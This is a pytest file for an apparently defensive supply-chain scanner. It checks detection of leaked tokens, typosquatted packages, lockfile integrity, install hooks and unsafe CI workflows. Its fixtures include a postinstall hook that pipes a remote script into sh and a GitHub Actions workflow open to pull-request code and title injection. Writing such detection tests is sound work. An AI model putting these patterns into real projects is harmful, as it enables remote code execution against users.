import json

from conftest import write

from ztrust.engine import run_scan
from ztrust.scanners.typosquat import damerau_levenshtein, find_lookalike
from ztrust.scanners.vulns import cvss3_base_score

# Secrets are assembled at runtime so this file never contains a real-looking token.
GITHUB_TOKEN = "ghp" + "_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"


def rule_ids(result):
    return {f.rule_id for f in result.findings}


def test_detects_github_token_and_respects_ignore(tmp_path):
    write(tmp_path, "app/settings.py", f'TOKEN = "{GITHUB_TOKEN}"\n')
    write(tmp_path, "app/other.py", f'TOKEN = "{GITHUB_TOKEN}"  # ztrust:ignore\n')
    result = run_scan(tmp_path, offline=True, only={"secrets"})
    hits = [f for f in result.findings if f.rule_id == "ZT-SEC-002"]
    assert len(hits) == 1 and hits[0].file == "app/settings.py" and hits[0].line == 1
    assert GITHUB_TOKEN not in hits[0].description  # redacted


def test_generic_secret_ignores_placeholders(tmp_path):
    write(tmp_path, "config.py", 'api_key = "your_api_key_goes_here_123"\nsecret = "Zk8#pQ2vL9xR4mT7wB1n"\n')
    result = run_scan(tmp_path, offline=True, only={"secrets"})
    assert [f.line for f in result.findings if f.rule_id == "ZT-SEC-030"] == [2]


def test_typosquat_detection():
    assert find_lookalike("reqeusts", "PyPI") == ("requests", "one character away")
    assert find_lookalike("crossenv", "npm")[0] == "cross-env"
    assert find_lookalike("l0dash", "npm")[0] == "lodash"
    assert find_lookalike("requests", "PyPI") is None
    assert find_lookalike("@acme/lodash", "npm") is None
    assert damerau_levenshtein("abcd", "abdc") == 1


def test_requirements_and_integrity(tmp_path):
    write(tmp_path, "requirements.txt", "flask\nreqeusts==2.31.0\nsix==1.16.0 --hash=sha256:abc\n")
    result = run_scan(tmp_path, offline=True)
    names = {d.name for d in result.dependencies}
    assert {"flask", "reqeusts", "six"} <= names
    assert "ZT-TYPO-001" in rule_ids(result)
    assert "ZT-INT-004" in rule_ids(result)  # flask unpinned


def test_package_lock_and_scripts(tmp_path):
    lock = {
        "lockfileVersion": 3,
        "packages": {
            "": {"name": "demo"},
            "node_modules/left-pad": {"version": "1.3.0", "resolved": "http://registry.example/left-pad.tgz"},
            "node_modules/esbuild": {
                "version": "0.20.0",
                "resolved": "https://registry.npmjs.org/esbuild/-/esbuild-0.20.0.tgz",
                "integrity": "sha512-x",
                "hasInstallScript": True,
            },
        },
    }
    write(tmp_path, "package-lock.json", json.dumps(lock))
    write(tmp_path, "package.json", json.dumps({"scripts": {"postinstall": "curl -s https://x.sh | sh"}}))
    result = run_scan(tmp_path, offline=True)
    assert {"ZT-INT-002", "ZT-INT-006", "ZT-INT-007"} <= rule_ids(result)


def test_github_actions_rules(tmp_path):
    write(
        tmp_path,
        ".github/workflows/pr.yml",
        """
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - uses: someone/some-action@main
      - run: echo "${{ github.event.pull_request.title }}"
""",
    )
    result = run_scan(tmp_path, offline=True, only={"ci"})
    assert {"ZT-CI-001", "ZT-CI-002", "ZT-CI-003", "ZT-CI-004"} <= rule_ids(result)
    assert result.findings[0].rule_id == "ZT-CI-002"  # critical sorts first


def test_policy_file(tmp_path):
    write(tmp_path, ".ztrust.yml", "disable_rules: ['ZT-INT-*']\nallowlist_packages: [reqeusts]\n")
    write(tmp_path, "requirements.txt", "flask\nreqeusts==1.0\n")
    result = run_scan(tmp_path, offline=True)
    assert not result.findings


def test_go_mod(tmp_path):
    write(tmp_path, "go.mod", "module x\n\nrequire (\n\tgolang.org/x/net v0.17.0\n\tgithub.com/a/b v1.2.3 // indirect\n)\n")
    result = run_scan(tmp_path, offline=True, scanners=[])
    deps = {d.name: d for d in result.dependencies}
    assert deps["golang.org/x/net"].version == "0.17.0"
    assert deps["github.com/a/b"].direct is False


def test_cvss_score():
    assert cvss3_base_score("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H") == 9.8
    assert cvss3_base_score("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H") == 10.0
    assert cvss3_base_score("CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N") == 5.5
